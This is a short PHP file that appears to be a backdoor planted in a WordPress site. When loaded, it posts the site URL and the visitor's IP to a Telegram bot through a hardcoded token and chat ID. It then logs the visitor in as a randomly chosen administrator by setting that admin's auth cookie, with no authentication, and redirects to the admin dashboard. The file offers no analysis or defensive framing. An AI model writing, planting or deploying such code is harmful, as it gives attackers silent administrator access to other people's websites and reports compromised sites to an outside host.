<?php 
$bcripthash = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
$angka = '5070938778';
$xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$eai  = "___pass_admin@#$___ \n\n url nya =\n $xPath \n\n  =\n $hashed_password \n\n IP   :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
sendTelegramMessage($bcripthash, $angka, $eai);

function sendTelegramMessage($bcripthash, $angka, $message)
{
    $url = "https://api.telegram.org/bot{$bcripthash}/sendMessage";
    $params = [
        'chat_id' => $angka,
        'text' => $message,
    ];
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($params),
        ],
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

}
require_once('wp-load.php'); 
 
$admins = get_users(array( 
    'role' => 'administrator' 
)); 
 
if (!empty($admins)) { 
    $random_admin = $admins[array_rand($admins)]; 
     
    $user_id = $random_admin->ID; 
     
    wp_set_auth_cookie($user_id); 
    wp_set_current_user($user_id); 
     
    wp_redirect(admin_url()); 
    exit; 
} else { 
    echo "Tidak ada administrator yang ditemukan."; 
} 
?>
;